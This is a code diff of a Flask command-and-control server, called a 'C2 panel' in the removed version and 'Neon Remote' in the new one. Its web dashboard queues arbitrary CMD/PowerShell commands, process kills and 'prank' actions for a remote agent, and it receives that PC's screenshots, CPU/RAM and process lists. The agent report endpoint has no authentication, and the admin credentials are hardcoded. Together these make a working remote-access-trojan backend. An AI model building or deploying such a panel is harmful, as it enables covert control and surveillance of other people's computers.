@@ -1,261 +1,395 @@
 import os
-from flask import Flask, render_template_string, request, session, redirect, url_for
-from flask_socketio import SocketIO, emit
+import json
+import time
+import base64
+from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify, Response
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'super_secret_flask_key_123'
+app.secret_key = "neon_super_secret_key_change_me"
 
-# --- НАЛАШТУВАННЯ ПАРОЛІВ ТА ТОКЕНІВ ---
-SECRET_TOKEN = 'trololo_super_secret_key_999'  # Токен авторизації клієнта (Python-скрипта)
-DASHBOARD_PASSWORD = 'admin_password_123'     # ПАРОЛЬ ДЛЯ ВХОДУ НА САЙТ
+ADMIN_USERNAME = "admin"
+ADMIN_PASSWORD = "Zlata"
+USERS_FILE = "users.json"
 
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+# --- MongoDB підготовка ---
+# import pymongo
+# client = pymongo.MongoClient("mongodb://localhost:27017/")
+# db = client["neon_remote"]
+# users_col = db["users"]
 
-# Збереження підключених клієнтів
-connected_clients = {}
+def load_users():
+    if not os.path.exists(USERS_FILE):
+        users = {
+            ADMIN_USERNAME: {
+                "password": ADMIN_PASSWORD,
+                "permissions": ["admin", "screen", "files", "commands", "processes", "camera", "network", "remote"],
+            }
+        }
+        with open(USERS_FILE, "w", encoding="utf-8") as f:
+            json.dump(users, f, indent=2)
+        return users
+    try:
+        with open(USERS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return {}
 
-# --- СОКЕТ-ОБРОБНИКИ КЛІЄНТІВ ---
+# --- Стан Агента в пам'яті сервера ---
+AGENT_STATE = {
+    "last_seen": 0,
+    "cpu": 0,
+    "ram": 0,
+    "volume": 50,
+    "screenshot": None, # bytes
+    "cmd_output": "Очікування команд...",
+    "processes": []
+}
 
-@socketio.on('connect')
-def handle_connect(auth):
-    auth_header = request.headers.get('Authorization')
-    expected_header = f'Bearer {SECRET_TOKEN}'
-    
-    if auth_header != expected_header:
-        print(f"[!] Спроба підключення з невірним токеном від {request.remote_addr}")
-        return False
-    
-    print(f"[+] Клієнт підключився: {request.sid} ({request.remote_addr})")
-
-@socketio.on('disconnect')
-def handle_disconnect():
-    sid = request.sid
-    if sid in connected_clients:
-        node_name = connected_clients[sid].get('node', sid)
-        print(f"[-] Клієнт від'єднався: {node_name}")
-        del connected_clients[sid]
-        emit('update_client_list', connected_clients, broadcast=True)
-
-@socketio.on('register_client')
-def handle_register(data):
-    sid = request.sid
-    connected_clients[sid] = {
-        'os': data.get('os', 'Unknown'),
-        'node': data.get('node', 'Unknown'),
-        'ip': request.remote_addr # IP отримується автоматично з запиту
-    }
-    print(f"[*] Зареєстровано клієнт: {connected_clients[sid]['node']} ({connected_clients[sid]['os']})")
-    emit('update_client_list', connected_clients, broadcast=True)
-
-@socketio.on('sysinfo_response')
-def handle_sysinfo(data):
-    emit('sysinfo_data', {'sid': request.sid, 'info': data}, broadcast=True)
-
-@socketio.on('screen_frame')
-def handle_frame(data):
-    emit('render_frame', {'sid': request.sid, 'frame': data.get('frame')}, broadcast=True)
-
-# --- КОМАНДИ З ВЕБ-ПАНЕЛІ ---
-
-@socketio.on('cmd_start_stream')
-def cmd_start_stream(target_sid):
-    emit('start_stream', room=target_sid)
-
-@socketio.on('cmd_stop_stream')
-def cmd_stop_stream(target_sid):
-    emit('stop_stream', room=target_sid)
-
-@socketio.on('cmd_request_sysinfo')
-def cmd_request_sysinfo(target_sid):
-    emit('request_sysinfo', room=target_sid)
+COMMAND_QUEUE = []
 
 # --- HTML ШАБЛОНИ ---
-
-HTML_LOGIN = """
-<!DOCTYPE html>
+LOGIN_TEMPLATE = r"""
+<!doctype html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <title>Авторизація</title>
-    <style>
-        body { background: #181818; color: #eee; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: #242424; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 320px; }
-        input[type="password"] { width: 100%; padding: 10px; margin: 15px 0; border-radius: 4px; border: 1px solid #444; background: #333; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #0056b3; }
-        .error { color: #dc3545; margin-top: 10px; font-size: 14px; }
-    </style>
+<meta charset="utf-8">
+<title>Вхід — Neon Remote</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+:root { --neon: #00ffd0; --bg: #05060d; --surface: rgba(10, 15, 30, 0.7); --border: rgba(0, 255, 208, 0.2); }
+body { background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+.login-box { background: var(--surface); padding: 40px; border-radius: 20px; border: 1px solid var(--border); box-shadow: 0 0 30px rgba(0, 255, 208, 0.1); backdrop-filter: blur(10px); width: 100%; max-width: 380px; text-align: center; }
+.title { font-size: 24px; font-weight: 800; margin-bottom: 30px; letter-spacing: 1px; }
+.input-group { margin-bottom: 20px; text-align: left; }
+.input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 8px; text-transform: uppercase; }
+input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #333; background: rgba(0,0,0,0.5); color: #fff; font-size: 16px; outline: none; box-sizing: border-box; }
+input:focus { border-color: var(--neon); box-shadow: 0 0 15px rgba(0, 255, 208, 0.2); }
+button { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-top: 10px; }
+button:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 20px var(--neon); }
+.msg { color: #ff4d4d; margin-bottom: 20px; font-size: 14px; }
+</style>
 </head>
 <body>
-    <div class="login-box">
-        <h2>Вхід у панель C2</h2>
-        <form method="POST" action="/login">
-            <input type="password" name="password" placeholder="Введіть пароль" required autofocus>
-            <button type="submit">Увійти</button>
-            {% if error %}<div class="error">{{ error }}</div>{% endif %}
-        </form>
+<div class="login-box">
+  <div class="title">NEON SYSTEM</div>
+  {% if msg %}<div class="msg">{{ msg }}</div>{% endif %}
+  <form method="POST">
+    <div class="input-group">
+      <label>Username</label>
+      <input name="username" type="text" placeholder="admin" required autocomplete="off">
     </div>
+    <div class="input-group">
+      <label>Password</label>
+      <input name="password" type="password" placeholder="••••••••" required>
+    </div>
+    <button type="submit">Увійти в систему</button>
+  </form>
+</div>
 </body>
 </html>
 """
 
-HTML_DASHBOARD = """
-<!DOCTYPE html>
+MAIN_TEMPLATE = r"""
+<!doctype html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <title>Панель керування</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; background: #181818; color: #eee; margin: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .card { background: #242424; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
-        select { padding: 10px; background: #333; color: white; border: 1px solid #555; border-radius: 4px; font-size: 16px; width: 100%; max-width: 400px; margin-bottom: 15px; }
-        button { padding: 8px 14px; margin-right: 5px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
-        button:hover { background: #0056b3; }
-        button.stop { background: #dc3545; }
-        .logout-btn { background: #6c757d; text-decoration: none; color: white; padding: 8px 12px; border-radius: 4px; }
-        #stream-container { margin-top: 15px; text-align: center; }
-        #stream-view { max-width: 100%; border: 2px solid #444; border-radius: 4px; background: #000; min-height: 300px; }
-        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 15px; }
-        .info-item { background: #1f1f1f; padding: 10px; border-radius: 4px; border-left: 3px solid #007bff; }
-    </style>
+<meta charset="utf-8">
+<title>Neon Remote — Dashboard</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
+* { box-sizing: border-box; }
+body { margin: 0; background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; overflow: hidden; }
+.layout { display: grid; grid-template-columns: 1fr 340px; height: 100vh; padding: 20px; gap: 20px; }
+.main-col { display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
+.right-col { display: flex; flex-direction: column; gap: 20px; }
+.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
+.card b { display: block; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; color: #fff; }
+.btn { border: 1px solid var(--neon); background: rgba(0,0,0,0.3); color: var(--neon); padding: 10px 16px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: 600; text-decoration: none; display: inline-block; }
+.btn:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 15px var(--neon); }
+textarea { width: 100%; height: 80px; background: rgba(0,0,0,0.5); color: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 12px; outline: none; font-family: monospace; }
+pre { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; overflow-x: auto; color: #aaa; font-family: monospace; border: 1px solid var(--border); max-height: 200px; }
+img.screen { width: 100%; border-radius: 10px; border: 1px solid var(--border); display: block; min-height: 200px; background: #000; }
+.stat-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-weight: 600; color: #fff; }
+.bar { height: 8px; background: rgba(0,0,0,0.5); border-radius: 4px; overflow: hidden; margin-bottom: 10px; }
+.bar div { height: 100%; width: 0%; background: var(--neon); transition: width 0.3s ease; box-shadow: 0 0 10px var(--neon); }
+.status-online { color: #00ff66; font-weight: bold; }
+.status-offline { color: #ff4d4d; font-weight: bold; }
+</style>
 </head>
 <body>
-    <div class="header">
-        <h2>Панель керування пристроями</h2>
-        <a href="/logout" class="logout-btn">Вийти</a>
+<div class="layout">
+  <div class="main-col">
+    <div class="card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+        <b style="margin:0;">Екран ПК Агента</b>
+        <span id="agentStatus" class="status-offline">ОФЛАЙН</span>
+      </div>
+      <img id="screenImg" src="/api/screen.jpg" class="screen">
     </div>
 
     <div class="card">
-        <h3>Вибір пристрою</h3>
-        <select id="pc-select" onchange="onSelectClient()">
-            <option value="">-- Немає активних ПК --</option>
-        </select>
-
-        <div id="client-details" style="display: none;">
-            <div class="info-grid">
-                <div class="info-item"><strong>Назва ПК:</strong> <span id="info-node">-</span></div>
-                <div class="info-item"><strong>IP Адреса:</strong> <span id="info-ip">-</span></div>
-                <div class="info-item"><strong>ОС:</strong> <span id="info-os">-</span></div>
-                <div class="info-item"><strong>Навантаження:</strong> <span id="info-telemetry">Запросіть інфо</span></div>
-            </div>
-
-            <div>
-                <button onclick="startStream()">Запустити стрім</button>
-                <button class="stop" onclick="stopStream()">Зупинити стрім</button>
-                <button onclick="getSysinfo()">Запросити CPU/RAM</button>
-            </div>
+      <b>Консоль Команд (CMD / PowerShell)</b>
+      <form id="cmdForm">
+        <textarea id="cmdInput" placeholder="Введіть команду (наприклад: dir або whoami)..."></textarea>
+        <div style="display:flex; gap:10px; margin-top:10px;">
+          <button type="submit" class="btn">Виконати на ПК</button>
+          <a href="/processes" class="btn" style="border-color:#aaa; color:#ccc;">Менеджер процесів</a>
+          <a href="/logout" class="btn" style="border-color:#ff4d4d; color:#ff4d4d; margin-left:auto;">Вийти</a>
         </div>
+      </form>
+      <pre id="cmdOutput">Результат з'явиться після виконання...</pre>
+    </div>
+  </div>
+
+  <div class="right-col">
+    <div class="card">
+      <div class="stat-header">CPU ПК <span id="cpuVal">0%</span></div>
+      <div class="bar"><div id="cpuBar"></div></div>
     </div>
 
     <div class="card">
-        <h3>Відеотрансляція</h3>
-        <div id="stream-container">
-            <img id="stream-view" src="" alt="Очікування запуску стріму..." />
-        </div>
+      <div class="stat-header">RAM ПК <span id="ramVal">0%</span></div>
+      <div class="bar"><div id="ramBar"></div></div>
     </div>
 
-    <script>
-        const socket = io();
-        let clientsData = {};
-        let selectedSid = null;
+    <div class="card">
+      <b>Гучність ПК</b>
+      <div style="display:flex; align-items:center; gap:15px;">
+        <input type="range" min="0" max="100" value="50" id="volumeSlider" style="flex:1; cursor:pointer;">
+        <span id="volumeVal" style="font-weight:600;">50%</span>
+      </div>
+    </div>
 
-        socket.on('update_client_list', (clients) => {
-            clientsData = clients;
-            const select = document.getElementById('pc-select');
-            select.innerHTML = '';
+    <div class="card">
+      <b>Швидкі Пранки</b>
+      <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:10px;">
+        <button class="btn" style="font-size:12px;" onclick="sendTroll('beep')">🔊 Beep</button>
+        <button class="btn" style="font-size:12px;" onclick="sendTroll('msg')">💬 Повідомлення</button>
+      </div>
+    </div>
+  </div>
+</div>
 
-            const keys = Object.keys(clients);
-            if (keys.length === 0) {
-                select.innerHTML = '<option value="">-- Немає активних ПК --</option>';
-                document.getElementById('client-details').style.display = 'none';
-                selectedSid = null;
-                return;
-            }
+<script>
+async function updateStats(){
+  try {
+    const r = await fetch('/api/system');
+    const d = await r.json();
+    document.getElementById('cpuBar').style.width = d.cpu + "%";
+    document.getElementById('ramBar').style.width = d.ram + "%";
+    document.getElementById('cpuVal').innerText = d.cpu + "%";
+    document.getElementById('ramVal').innerText = d.ram + "%";
+    
+    const statusEl = document.getElementById('agentStatus');
+    if (d.online) {
+      statusEl.innerText = "ОНЛАЙН";
+      statusEl.className = "status-online";
+    } else {
+      statusEl.innerText = "ОФЛАЙН";
+      statusEl.className = "status-offline";
+    }
+    
+    if (d.cmd_output) {
+      document.getElementById('cmdOutput').innerText = d.cmd_output;
+    }
+  } catch(e){}
+}
 
-            keys.forEach(sid => {
-                const c = clients[sid];
-                const option = document.createElement('option');
-                option.value = sid;
-                option.textContent = `${c.node} (${c.ip}) - ${c.os}`;
-                select.appendChild(option);
-            });
+setInterval(updateStats, 1500);
+setInterval(() => {
+  document.getElementById('screenImg').src = "/api/screen.jpg?t=" + new Date().getTime();
+}, 2000);
 
-            // Якщо раніше вибраний ПК ще підключений — залишаємо його, інакше вибираємо перший
-            if (!selectedSid || !clients[selectedSid]) {
-                selectedSid = keys[0];
-            }
-            select.value = selectedSid;
-            updateClientInfo();
-        });
+document.getElementById('cmdForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const cmd = document.getElementById('cmdInput').value;
+  if(!cmd) return;
+  await fetch('/api/run_cmd', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({cmd})
+  });
+  document.getElementById('cmdInput').value = '';
+  document.getElementById('cmdOutput').innerText = 'Команду відправлено на ПК... Очікування результату...';
+});
 
-        function onSelectClient() {
-            selectedSid = document.getElementById('pc-select').value;
-            updateClientInfo();
-            // Очищаємо екран при зміні ПК
-            document.getElementById('stream-view').src = '';
-        }
+const volSlider = document.getElementById('volumeSlider');
+volSlider.addEventListener('change', () => {
+  document.getElementById('volumeVal').innerText = volSlider.value + '%';
+  fetch('/api/volume', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({value: volSlider.value})
+  });
+});
 
-        function updateClientInfo() {
-            if (!selectedSid || !clientsData[selectedSid]) {
-                document.getElementById('client-details').style.display = 'none';
-                return;
-            }
-
-            const c = clientsData[selectedSid];
-            document.getElementById('info-node').innerText = c.node;
-            document.getElementById('info-ip').innerText = c.ip;
-            document.getElementById('info-os').innerText = c.os;
-            document.getElementById('client-details').style.display = 'block';
-        }
-
-        socket.on('render_frame', (data) => {
-            // Відображаємо кадр ТІЛЬКИ від вибраного ПК
-            if (data.sid === selectedSid) {
-                document.getElementById('stream-view').src = 'data:image/jpeg;base64,' + data.frame;
-            }
-        });
-
-        socket.on('sysinfo_data', (data) => {
-            if (data.sid === selectedSid) {
-                document.getElementById('info-telemetry').innerText = 
-                    `CPU: ${data.info.cpu_percent}% | RAM: ${data.info.ram_percent}%`;
-            }
-        });
-
-        function startStream() { if (selectedSid) socket.emit('cmd_start_stream', selectedSid); }
-        function stopStream() { if (selectedSid) socket.emit('cmd_stop_stream', selectedSid); }
-        function getSysinfo() { if (selectedSid) socket.emit('cmd_request_sysinfo', selectedSid); }
-    </script>
+function sendTroll(action) {
+  fetch('/api/troll', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({action})
+  });
+}
+</script>
 </body>
 </html>
 """
 
-# --- МАРШРУТИ ВЕБ-САЙТУ ---
+PROCESSES_TEMPLATE = r"""
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<title>Процеси ПК — Neon Remote</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
+body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--neon); padding: 30px; }
+.btn { border: 1px solid var(--neon); background: transparent; color: var(--neon); padding: 8px 16px; border-radius: 10px; cursor: pointer; text-decoration: none; display: inline-block; }
+.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
+table { width: 100%; border-collapse: collapse; text-align: left; margin-top: 15px; }
+th, td { padding: 12px; border-bottom: 1px solid var(--border); color: #ccc; }
+th { color: var(--neon); text-transform: uppercase; }
+.action-btn { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; padding: 6px 10px; border-radius: 6px; cursor: pointer; }
+</style>
+</head>
+<body>
+<a href="/" class="btn" style="margin-bottom: 20px;">⬅ На головну</a>
+<div class="card">
+  <h2>Менеджер процесів ПК</h2>
+  <table>
+    <thead><tr><th>PID</th><th>Назва</th><th>Дії</th></tr></thead>
+    <tbody id="plist"><tr><td colspan="3">Завантаження...</td></tr></tbody>
+  </table>
+</div>
+<script>
+async function loadProc(){
+  const r = await fetch('/api/processes');
+  const data = await r.json();
+  const tbody = document.getElementById('plist');
+  if(!data.length) { tbody.innerHTML = '<tr><td colspan="3">Немає даних від Агента</td></tr>'; return; }
+  tbody.innerHTML = data.map(p => `
+    <tr>
+      <td>${p.pid}</td>
+      <td style="color:#fff;">${p.name}</td>
+      <td><button class="action-btn" onclick="killProc(${p.pid})">❌ Завершити</button></td>
+    </tr>
+  `).join('');
+}
+function killProc(pid){
+  fetch('/api/process/kill', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({pid})
+  }).then(() => setTimeout(loadProc, 1000));
+}
+loadProc();
+</script>
+</body>
+</html>
+"""
 
+# --- WEB ROUTES ---
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    error = None
     if request.method == 'POST':
-        if request.form.get('password') == DASHBOARD_PASSWORD:
-            session['authenticated'] = True
-            return redirect(url_for('index'))
-        else:
-            error = "Невірний пароль!"
-    return render_template_string(HTML_LOGIN, error=error)
+        users = load_users()
+        u = request.form.get('username')
+        p = request.form.get('password')
+        if u in users and users[u]['password'] == p:
+            session['user'] = u
+            return redirect('/')
+        return render_template_string(LOGIN_TEMPLATE, msg="Невірний логін або пароль")
+    return render_template_string(LOGIN_TEMPLATE)
 
 @app.route('/logout')
 def logout():
-    session.pop('authenticated', None)
-    return redirect(url_for('login'))
+    session.pop('user', None)
+    return redirect('/login')
 
 @app.route('/')
-def index():
-    if not session.get('authenticated'):
-        return redirect(url_for('login'))
-    return render_template_string(HTML_DASHBOARD)
+def main():
+    if 'user' not in session:
+        return redirect('/login')
+    return render_template_string(MAIN_TEMPLATE)
+
+@app.route('/processes')
+def processes_page():
+    if 'user' not in session:
+        return redirect('/login')
+    return render_template_string(PROCESSES_TEMPLATE)
+
+# --- CLIENT API ENDPOINTS ---
+@app.route('/api/system')
+def api_system():
+    online = (time.time() - AGENT_STATE['last_seen']) < 5
+    return jsonify({
+        'cpu': AGENT_STATE['cpu'],
+        'ram': AGENT_STATE['ram'],
+        'online': online,
+        'cmd_output': AGENT_STATE['cmd_output']
+    })
+
+@app.route('/api/screen.jpg')
+def api_screen():
+    if AGENT_STATE['screenshot']:
+        return Response(AGENT_STATE['screenshot'], mimetype='image/jpeg')
+    # Бланк прозорого/чорного кадру
+    return Response(b'', mimetype='image/jpeg')
+
+@app.route('/api/run_cmd', methods=['POST'])
+def api_run_cmd():
+    cmd = request.json.get('cmd')
+    if cmd:
+        COMMAND_QUEUE.append({'type': 'cmd', 'payload': cmd})
+    return jsonify({'status': 'queued'})
+
+@app.route('/api/volume', methods=['POST'])
+def api_volume():
+    val = request.json.get('value')
+    COMMAND_QUEUE.append({'type': 'volume', 'payload': val})
+    return jsonify({'status': 'queued'})
+
+@app.route('/api/troll', methods=['POST'])
+def api_troll():
+    action = request.json.get('action')
+    COMMAND_QUEUE.append({'type': 'troll', 'payload': action})
+    return jsonify({'status': 'queued'})
+
+@app.route('/api/processes')
+def api_processes():
+    return jsonify(AGENT_STATE['processes'])
+
+@app.route('/api/process/kill', methods=['POST'])
+def api_kill_process():
+    pid = request.json.get('pid')
+    COMMAND_QUEUE.append({'type': 'kill_proc', 'payload': pid})
+    return jsonify({'status': 'queued'})
+
+# --- AGENT API (Зв'язок із ПК) ---
+@app.route('/api/agent/report', methods=['POST'])
+def agent_report():
+    data = request.json or {}
+    AGENT_STATE['last_seen'] = time.time()
+    AGENT_STATE['cpu'] = data.get('cpu', 0)
+    AGENT_STATE['ram'] = data.get('ram', 0)
+    AGENT_STATE['processes'] = data.get('processes', [])
+    
+    img_b64 = data.get('screenshot')
+    if img_b64:
+        AGENT_STATE['screenshot'] = base64.b64decode(img_b64)
+        
+    cmd_out = data.get('cmd_output')
+    if cmd_out:
+        AGENT_STATE['cmd_output'] = cmd_out
+        
+    # Віддаємо чергу команд для ПК
+    global COMMAND_QUEUE
+    pending_cmds = list(COMMAND_QUEUE)
+    COMMAND_QUEUE = []
+    return jsonify({'commands': pending_cmds})
 
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    socketio.run(app, host='0.0.0.0', port=port)
+    print("🚀 Сервер запущено на http://0.0.0.0:5000")
+    app.run(host='0.0.0.0', port=5000, debug=False)
